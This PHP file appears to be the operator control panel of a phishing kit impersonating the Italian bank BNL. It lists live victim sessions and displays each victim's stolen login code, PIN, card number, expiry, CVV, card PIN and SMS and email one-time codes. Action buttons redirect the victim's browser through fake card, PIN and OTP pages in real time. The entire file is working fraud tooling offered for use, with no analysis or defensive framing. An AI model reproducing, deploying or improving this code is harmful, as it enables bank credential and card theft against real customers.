<?php
require_once __DIR__ . '/telegram_config.php';

$id  = $_GET['id']  ?? '';
$df  = __DIR__ . '/data.json';

if (!$id) {
    $data = file_exists($df) ? json_decode(file_get_contents($df), true) : ['sessions' => []];
    $sessions = $data['sessions'] ?? [];
    ?>
    <!DOCTYPE html>
    <html lang="it">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BNL - Pannello</title>
    <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#1a1a1a;color:#eee;padding:20px;font-size:14px}
    h1{color:#00723b;margin-bottom:20px;font-size:22px}
    table{width:100%;border-collapse:collapse;background:#222;border-radius:8px;overflow:hidden}
    th,td{padding:10px 12px;text-align:left;border-bottom:1px solid #333;font-size:12px}
    th{background:#333;color:#aaa;font-size:10px;text-transform:uppercase;letter-spacing:1px}
    tr:hover{background:#2a2a2a}
    a{color:#4caf50;text-decoration:none;font-weight:500}
    a:hover{text-decoration:underline}
    .empty{text-align:center;padding:40px;color:#666}
    .dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:6px;vertical-align:middle}
    .dot-on{background:#4caf50;box-shadow:0 0 6px #4caf50}
    .dot-off{background:#666}
    .page-tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;background:#444;color:#fff}
    .page-login{background:#444}
    .page-verifica{background:#666}
    .page-carta{background:#ff9800}
    .page-pin_carta{background:#e65100}
    .page-otp_sms{background:#2196f3}
    .page-otp_mail{background:#9c27b0}
    .page-finish{background:#f44336}
    .page-unknown{background:#999}
    </style>
    </head>
    <body>
    <h1>PANNELLO BNL - Sessioni</h1>
    <?php if (empty($sessions)): ?>
        <div class="empty">Nessuna sessione attiva</div>
    <?php else: ?>
        <table>
        <tr>
            <th>Stato</th>
            <th>ID</th>
            <th>NC</th>
            <th>IP</th>
            <th>Pagina</th>
            <th>Status</th>
            <th>Ultimo ping</th>
            <th></th>
        </tr>
        <?php foreach (array_reverse($sessions, true) as $sid => $s):
            $now = time();
            $last = (int)($s['last_seen'] ?? 0);
            $online = ($last > 0 && ($now - $last) < 15);
            $cp = $s['current_page'] ?? 'unknown';
            $pageClass = 'page-' . htmlspecialchars($cp);
        ?>
            <tr>
                <td>
                    <span class="dot <?php echo $online ? 'dot-on' : 'dot-off'; ?>"></span>
                    <?php echo $online ? 'ONLINE' : 'OFF'; ?>
                </td>
                <td><code><?php echo substr($sid, 0, 10); ?></code></td>
                <td><?php echo htmlspecialchars($s['nc'] ?? '-'); ?></td>
                <td><?php echo htmlspecialchars($s['ip'] ?? '-'); ?></td>
                <td><span class="page-tag <?php echo $pageClass; ?>"><?php echo htmlspecialchars($cp); ?></span></td>
                <td><?php echo htmlspecialchars($s['status'] ?? '-'); ?></td>
                <td><?php echo $last > 0 ? date('H:i:s', $last) : '-'; ?></td>
                <td><a href="panel.php?id=<?php echo urlencode($sid); ?>">Apri</a></td>
            </tr>
        <?php endforeach; ?>
        </table>
    <?php endif; ?>
    <script>setTimeout(function(){location.reload();}, 5000);</script>
    </body>
    </html>
    <?php exit;
}

if (!file_exists($df)) { die('Nessun dato'); }
$data = json_decode(file_get_contents($df), true);
if (!isset($data['sessions'][$id])) { die('Sessione non trovata'); }
$s = $data['sessions'][$id];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $now = time();
    $action = $_POST['action'];
    $data['sessions'][$id]['updated_at'] = date('Y-m-d H:i:s');
    
    switch ($action) {
        case 'carta':
            $data['sessions'][$id]['status']         = 'carta';
            $data['sessions'][$id]['next_page']      = 'carta';
            $data['sessions'][$id]['force_redirect'] = $now;
            break;
        case 'pin_carta':
            $data['sessions'][$id]['status']         = 'pin_carta';
            $data['sessions'][$id]['next_page']      = 'pin_carta';
            $data['sessions'][$id]['force_redirect'] = $now;
            break;
        case 'otp_sms':
            $data['sessions'][$id]['status']         = 'otp_sms';
            $data['sessions'][$id]['next_page']      = 'otp_sms';
            $data['sessions'][$id]['force_redirect'] = $now;
            break;
        case 'otp_mail':
            $data['sessions'][$id]['status']         = 'otp_mail';
            $data['sessions'][$id]['next_page']      = 'otp_mail';
            $data['sessions'][$id]['force_redirect'] = $now;
            break;
        case 'login_errore':
            $data['sessions'][$id]['status']         = 'login_errore';
            $data['sessions'][$id]['next_page']      = 'login_errore';
            $data['sessions'][$id]['force_redirect'] = $now;
            break;
        case 'finish':
            $data['sessions'][$id]['status']         = 'finish';
            $data['sessions'][$id]['next_page']      = 'finish';
            $data['sessions'][$id]['force_redirect'] = $now;
            $data['sessions'][$id]['current_page']   = 'finish';
            break;
    }
    file_put_contents($df, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    header("Location: panel.php?id=" . urlencode($id));
    exit;
}

$s = $data['sessions'][$id];
$now = time();
$last_seen = (int)($s['last_seen'] ?? 0);
$online = ($last_seen > 0 && ($now - $last_seen) < 15);
$cp = $s['current_page'] ?? 'unknown';
?>
<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNL Panel - <?php echo substr($id, 0, 12); ?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#1a1a1a;color:#eee;padding:16px;font-size:14px}
.wrap{max-width:1100px;margin:0 auto}
h1{color:#00723b;margin-bottom:6px;font-size:18px}
.id{color:#888;font-size:11px;margin-bottom:16px;font-family:monospace;word-break:break-all}
.row{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px;margin-bottom:16px}
.box{background:#222;border-radius:8px;padding:14px;border:1px solid #333}
.box h3{color:#aaa;font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;font-weight:600}
.box .v{color:#fff;font-size:14px;word-break:break-all;margin-bottom:4px}
.box code{color:#4caf50;font-size:13px}
.actions{display:grid;grid-template-columns:repeat(auto-fit,minmax(110px,1fr));gap:10px;margin-top:10px}
.btn{padding:12px 8px;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;color:#fff;font-family:inherit;text-align:center}
.btn-carta{background:#ff9800}
.btn-pin{background:#e65100}
.btn-sms{background:#2196f3}
.btn-mail{background:#9c27b0}
.btn-finish{background:#f44336}
.btn-errore{background:#ff5252}
.btn:hover{opacity:.85}
.status-line{background:#00723b;color:#fff;padding:12px 14px;border-radius:6px;margin-bottom:14px;font-weight:600;text-align:center;font-size:13px}
.status-line.wait{background:#666}
.status-line.carta{background:#ff9800}
.status-line.pin_carta{background:#e65100}
.status-line.otp_sms{background:#2196f3}
.status-line.otp_mail{background:#9c27b0}
.status-line.login_errore{background:#ff5252}
.status-line.finish{background:#f44336}
a.back{color:#888;text-decoration:none;font-size:12px;display:inline-block;margin-bottom:14px}
a.back:hover{color:#fff}
.online-bar{background:#222;border:1px solid #333;border-radius:8px;padding:12px 14px;margin-bottom:14px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px}
.online-info{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.dot{display:inline-block;width:12px;height:12px;border-radius:50%;vertical-align:middle}
.dot-on{background:#4caf50;box-shadow:0 0 8px #4caf50;animation:pulse 2s ease-in-out infinite}
.dot-off{background:#666}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}
.online-text{font-weight:600;font-size:13px}
.online-text.on{color:#4caf50}
.online-text.off{color:#999}
.page-tag{display:inline-block;padding:4px 10px;border-radius:4px;font-size:11px;font-weight:600;background:#444;color:#fff}
.page-login{background:#444}
.page-verifica{background:#666}
.page-carta{background:#ff9800}
.page-pin_carta{background:#e65100}
.page-otp_sms{background:#2196f3}
.page-otp_mail{background:#9c27b0}
.page-finish{background:#f44336}
.page-login_errore{background:#ff5252}
.page-unknown{background:#999}
.last-seen{font-size:11px;color:#888}
</style>
</head>
<body>
<div class="wrap">
    <a class="back" href="panel.php">Torna alla lista</a>
    <h1>PANNELLO BNL</h1>
    <div class="id">ID: <?php echo htmlspecialchars($id); ?></div>

    <div class="online-bar">
        <div class="online-info">
            <span class="dot <?php echo $online ? 'dot-on' : 'dot-off'; ?>"></span>
            <span class="online-text <?php echo $online ? 'on' : 'off'; ?>">
                <?php echo $online ? 'ONLINE' : 'OFFLINE'; ?>
            </span>
            <span class="page-tag page-<?php echo htmlspecialchars($cp); ?>">
                <?php echo strtoupper(htmlspecialchars($cp)); ?>
            </span>
        </div>
        <div class="last-seen">
            Ultimo ping: <?php echo $last_seen > 0 ? date('H:i:s', $last_seen) : 'mai'; ?>
        </div>
    </div>

    <div class="status-line <?php echo htmlspecialchars($s['status'] ?? 'waiting'); ?>">
        Stato: <?php echo strtoupper(htmlspecialchars($s['status'] ?? 'WAITING')); ?>
    </div>

    <div class="row">
        <div class="box">
            <h3>NC / PIN</h3>
            <div class="v">NC: <code><?php echo htmlspecialchars($s['nc'] ?? '-'); ?></code></div>
            <div class="v">PIN: <code><?php echo htmlspecialchars($s['pin'] ?? '-'); ?></code></div>
        </div>
        <div class="box">
            <h3>IP / Verdict</h3>
            <div class="v">IP: <code><?php echo htmlspecialchars($s['ip'] ?? '-'); ?></code></div>
            <div class="v">Verdict: <code><?php echo htmlspecialchars($s['verdict'] ?? '-'); ?></code></div>
            <div class="v" style="font-size:11px;color:#888;margin-top:4px"><?php echo htmlspecialchars($s['isp'] ?? ''); ?></div>
        </div>
        <div class="box">
            <h3>Carta</h3>
            <div class="v">Numero: <code><?php echo htmlspecialchars($s['carta_numero'] ?? '-'); ?></code></div>
            <div class="v">Scad: <code><?php echo htmlspecialchars($s['carta_scadenza'] ?? '-'); ?></code></div>
            <div class="v">CVV: <code><?php echo htmlspecialchars($s['carta_cvv'] ?? '-'); ?></code></div>
            <div class="v">PIN: <code><?php echo htmlspecialchars($s['pin_carta'] ?? '-'); ?></code></div>
        </div>
        <div class="box">
            <h3>OTP</h3>
            <div class="v">SMS: <code><?php echo htmlspecialchars($s['otp_sms'] ?? '-'); ?></code></div>
            <div class="v">Mail: <code><?php echo htmlspecialchars($s['otp_mail'] ?? '-'); ?></code></div>
        </div>
    </div>

    <h3 style="color:#aaa;font-size:11px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px">AZIONI</h3>
    <form method="POST" class="actions">
        <button type="submit" name="action" value="carta" class="btn btn-carta">CARTA</button>
        <button type="submit" name="action" value="pin_carta" class="btn btn-pin">PIN CARTA</button>
        <button type="submit" name="action" value="otp_sms" class="btn btn-sms">OTP SMS</button>
        <button type="submit" name="action" value="otp_mail" class="btn btn-mail">OTP EMAIL</button>
        <button type="submit" name="action" value="login_errore" class="btn btn-errore">LOGIN ERRORE</button>
        <button type="submit" name="action" value="finish" class="btn btn-finish">X (Fine)</button>
    </form>
</div>
<script>setTimeout(function(){location.reload();}, 3000);</script>
</body>
</html>